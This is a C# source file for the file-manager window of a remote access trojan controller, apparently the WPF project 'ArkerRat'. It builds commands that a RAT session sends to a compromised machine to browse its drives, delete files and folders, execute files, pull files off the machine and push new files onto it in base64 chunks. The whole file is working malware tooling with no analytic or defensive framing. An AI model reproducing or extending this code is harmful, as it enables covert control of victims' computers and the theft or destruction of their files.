using ArkerRatWpfVersion;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
using NAudio.Gui;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for File_Manager.xaml
    /// </summary>
    public partial class File_Manager : Window
    {
        public RATHostSession clientSession{ get; set; }
        public File_Manager(RATHostSession session)
        {
            InitializeComponent();
            clientSession = session;
            windowText.Content += " - " + clientSession.clientInfo[0];
            clientSession.fileManagerWindowIsAlreadyOpen= true;
            clientSession.SendData("§FileManagerStart§§FileManagerEnd§");
        }

        bool close = false;
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!close)
                e.Cancel = true;
        }

        public async void CloseWindow(object sender, RoutedEventArgs e)
        {
            clientSession.fileManagerWindowIsAlreadyOpen= false;
            close = true;
            Close();
            clientSession.SendData("§FileManagerStart§close§FileManagerEnd§");
        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        bool zoom = true;
        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {
            if (zoom)
            {
                this.Width = this.Width * 2;
                this.Height = this.Height * 2;

                customBorder.Height = customBorder.Height * 2;
                customBorder.Width = customBorder.Width * 2;

                zoom = false;
            }
            else
            {
                this.Width = this.Width / 2;
                this.Height = this.Height / 2;

                customBorder.Height = customBorder.Height / 2;
                customBorder.Width = customBorder.Width / 2;

                zoom = true;
            }

        }

        string selector = string.Empty;
        public void GenerateFileSystem(string data)
        {
            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                status.Content = "Refreshing...";
                fileManager.Items.Clear();
                pathSearch.Text = selector;
                if (data.Contains("§drives§"))
                {
                    pathSearch.Text = "";
                    data = data.Replace("§drives§", string.Empty);
                    string[] disks = data.Trim(',').Split(',');
                    foreach (string s in disks)
                    {                    
                        Button disk = new Button();
                        disk.Background = Brushes.Transparent;
                        disk.VerticalContentAlignment = VerticalAlignment.Bottom;

                        Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));
                        disk.Foreground = buttonBrush;
                        disk.BorderBrush= Brushes.Transparent;

                        disk.Width = 100;
                        disk.Height = 100;
                        disk.Tag = s;
                        disk.Content = s;

                        ImageBrush imageBrush = new ImageBrush();
                        imageBrush.ImageSource = TryFindResource("DriveImage") as BitmapImage; 
                        disk.Background = imageBrush;

                        disk.Click += new RoutedEventHandler(PathObjectClickedOn);
                        fileManager.Items.Add(disk);
                    }
                    status.Content = "status";
                }
                else
                {
                    string[] pathObjects = data.Trim(',').Split('|');

                    string[] files = pathObjects[0]?.Trim(',').Split(',');
                    string[] folders = pathObjects[1]?.Trim(',').Split(',');

                    foreach (var s in folders)
                    {
                        if ((s.Substring(s.LastIndexOf("\\") + 1)).Length > 0)
                        {

                            Button folder = new Button();
                            folder.VerticalContentAlignment = VerticalAlignment.Bottom;
                            folder.Background = Brushes.Transparent;
                            folder.Tag = s.Replace(@"\\", @"\");
                            folder.BorderBrush = null;
                            // Create the image brush
                            ImageBrush imageBrush = new ImageBrush();
                            imageBrush.ImageSource = TryFindResource("FolderImage") as BitmapImage; 
                            folder.Background = imageBrush;

                            Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));

                            folder.Foreground = buttonBrush;
                            folder.Width = 100;
                            folder.Height = 100;

                            string objectName = s.Substring(s.LastIndexOf("\\") + 1);
                            if (objectName.Length > 10)
                            {
                                objectName = objectName.Substring(0, 7) + "...";
                            }
                            folder.Content = objectName;

                            folder.Click += new RoutedEventHandler(PathObjectClickedOn);
                            folder.MouseRightButtonDown += new MouseButtonEventHandler(OpenContextMenuFolder);

                            fileManager.Items.Add(folder);
                        }
                    }

                    foreach (var s in files)
                    {
                        if((s.Substring(s.LastIndexOf("\\") + 1)).Length> 0)
                        {
                            Button file = new Button();
                            file.VerticalContentAlignment = VerticalAlignment.Bottom;
                            file.Background = Brushes.Transparent;
                            file.BorderBrush = null;
                            // Create the image brush
                            ImageBrush imageBrush = new ImageBrush();
                            imageBrush.ImageSource = TryFindResource("FileImage") as BitmapImage;
                            file.Background = imageBrush;

                            Brush buttonBrush = new SolidColorBrush((Color)ColorConverter.ConvertFromString("#FF9966FF"));
                            file.Foreground = buttonBrush;

                            file.Tag = "§file§" + s;
                            file.Width = 100;
                            file.Height = 100;

                            string objectName = s.Substring(s.LastIndexOf("\\") + 1);
                            if (objectName.Length > 10)
                            {
                                objectName = objectName.Substring(0, 7) + "...";
                            }
                            file.Content = objectName;

                            file.MouseRightButtonDown += new MouseButtonEventHandler(OpenContextMenuFile);
                            fileManager.Items.Add(file);
                        }                     
                    }
                    status.Content = "status";
                }
            }));
        }

        private async void PathObjectClickedOn(object sender, RoutedEventArgs e)
        {        
            Button button = ((Button)sender);
            if (selector == button.Tag?.ToString().Replace("§file§",string.Empty) && !(button.Tag?.ToString()).Contains("§file§"))
            {
                await clientSession.SendData("§FileManagerStart§" + selector + "§FileManagerEnd§");
            }
            else
            {
                selector= button.Tag.ToString().Replace("§file§",string.Empty);
            }
        }

        private void OpenContextMenuFolder(object sender, MouseEventArgs e)
        {
            Button folder = (Button)sender;

            folder.ContextMenu = new ContextMenu();

            folder.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
            folder.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));

            MenuItem delete = new MenuItem();
            delete.Header = "Delete folder";
            delete.Click += DeleteObject;
            delete.Icon = new Image
            {
                Stretch = Stretch.Uniform,
                Source = TryFindResource("RemoveImage") as BitmapImage
            };
            folder.ContextMenu.Items.Add(delete);
            folder.ContextMenu.Visibility = Visibility.Visible;
        }
        private void OpenContextMenuFile(object sender, MouseEventArgs e)
        {
            Button file = (Button)sender;

            file.ContextMenu = new ContextMenu();
            file.ContextMenu.Background = new SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 17, 20));
            file.ContextMenu.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(153, 102, 255));

            MenuItem delete = new MenuItem();
            delete.Header = "Delete file";
            delete.Click += DeleteObject;
            delete.Icon = new Image
            {
                Stretch = Stretch.Uniform,
                Source = TryFindResource("RemoveImage") as BitmapImage
            };

            MenuItem execute = new MenuItem();
            execute.Header = "Execute file";
            execute.Click += ExecuteFile;
            execute.Icon = new Image
            {
                Stretch = Stretch.Uniform,
                Source = TryFindResource("FileImage") as BitmapImage
            };

            MenuItem download = new MenuItem();
            download.Header = "Download file";
            download.Click += DownloadFile;
            download.Icon = new Image
            {
                Stretch = Stretch.Uniform,
                Source = TryFindResource("DownloadImage") as BitmapImage
            };

            file.ContextMenu.Items.Add(delete);
            file.ContextMenu.Items.Add(execute);
            file.ContextMenu.Items.Add(download);

            file.ContextMenu.Visibility = Visibility.Visible;
        }

        private async void DeleteObject(object sender, RoutedEventArgs e)
        {
            status.Content = "deleting...";

            MenuItem item = (MenuItem)sender;
            ContextMenu menu = (ContextMenu)item.Parent;
            Button _object = (Button)menu.PlacementTarget;
            string path = (_object.Tag.ToString()).Replace("§file§",string.Empty);

            if ((_object.Tag?.ToString()).Contains("§file§"))
            {
                await clientSession.SendData("§FileManagerStart§§delete§§file§" + path + "§FileManagerEnd§");
            }
            else
            {
                await clientSession.SendData("§FileManagerStart§§delete§" + path + "§FileManagerEnd§");
            }
        }

        private async void ExecuteFile(object sender, RoutedEventArgs e)
        {
            status.Content = "executing...";
            MenuItem item = (MenuItem)sender;
            ContextMenu menu = (ContextMenu)item.Parent;
            Button _object = (Button)menu.PlacementTarget;
            string path = (_object.Tag.ToString()).Replace("§file§", string.Empty);

            await clientSession.SendData("§FileManagerStart§§exe§" + path + "§FileManagerEnd§");
        }

        private async void DownloadFile(object sender, RoutedEventArgs e)
        {
            status.Content = "downloading...";
            MenuItem item = (MenuItem)sender;
            ContextMenu menu = (ContextMenu)item.Parent;
            Button _object = (Button)menu.PlacementTarget;
            string path = (_object.Tag.ToString()).Replace("§file§",string.Empty);
           System.Windows.Forms.FolderBrowserDialog whereToSaveFile = new System.Windows.Forms.FolderBrowserDialog();

            whereToSaveFile.Description = "Select a folder to save the file";

            System.Windows.Forms.DialogResult result = whereToSaveFile.ShowDialog();

            if (result == System.Windows.Forms.DialogResult.OK)
            {
                _path= whereToSaveFile.SelectedPath;
                await clientSession.SendData("§FileManagerStart§§DF§" + path + "§FileManagerEnd§");
            }
        }

        private void UploadFile(object sender, RoutedEventArgs e)
        {
            status.Content = "uploading...";
            OpenFileDialog fileExplorer = new OpenFileDialog();
            fileExplorer.Multiselect= true;
            bool? result = fileExplorer.ShowDialog();

            if(result == true)
            {
                Task.Run(() => SendFileChunks(fileExplorer.OpenFiles(), fileExplorer.FileNames));                  
            }
        }

        private async void SendFileChunks(Stream[] fileStreams, string[] fileNames)
        {

            for (int i = 0; i < fileStreams.Length; i++)
            {
                await clientSession.SendData("§FileManagerStart§§UF§§start§" + selector + fileNames[i].Substring(fileNames[i].LastIndexOf('\\')) +"§FileManagerEnd§");

                while (!clientSession.source.IsCancellationRequested) 
                {
                    byte[] buffer = new byte[8192];
                    int bytesRead = fileStreams[i].Read(buffer, 0, buffer.Length);

                    if(bytesRead == 0)
                    {
                        break;
                    }

                    await clientSession.SendData("§FileManagerStart§§UF§" + Convert.ToBase64String(buffer, 0, buffer.Length) +"§FileManagerEnd§");
                }
                await clientSession.SendData("§FileManagerStart§§UF§§end§§FileManagerEnd§");
            }
        }

        private async void GoBack(object sender, RoutedEventArgs e)
        {
            fileManager.Items.Clear();
            if(selector.Length< 5)
            {
                await clientSession.SendData("§FileManagerStart§§FileManagerEnd§");
                return;
            }

            string path = selector.Substring(0, selector.LastIndexOf('\\')+1);
            if (path.Length > 5)
            {
                path = path.Substring(0, path.Length - 1);
            }

            await clientSession.SendData("§FileManagerStart§" +path + "§FileManagerEnd§");
            selector = path;

        }

        private async void PathSearch(object sender, RoutedEventArgs e)
        {
            fileManager.Items.Clear();
            selector =pathSearch.Text;
            await clientSession.SendData("§FileManagerStart§" + pathSearch.Text + "§FileManagerEnd§");
        }

        string _path = string.Empty;
        public bool download = false;
        public ConcurrentQueue<string> dataBuffer = new ConcurrentQueue<string>();
        public void StartDownloadingFile(string name)
        {
            download = true;
            using (FileStream stream = new FileStream(_path+name, FileMode.Create, FileAccess.Write))
            {
                while (!clientSession.source.IsCancellationRequested&& download)
                {
                    string temp = string.Empty;
                    while (!dataBuffer.TryDequeue(out temp)) ;

                    byte[] buffer = Convert.FromBase64String(temp);
                    stream.Write(buffer, 0, buffer.Length);
                }
                stream.Close();
            }
            download= false;
        }

        private async void Refresh(object sender, RoutedEventArgs e)
        {
            await clientSession.SendData("§FileManagerStart§"+selector+"§FileManagerEnd§");
        }
    }
}
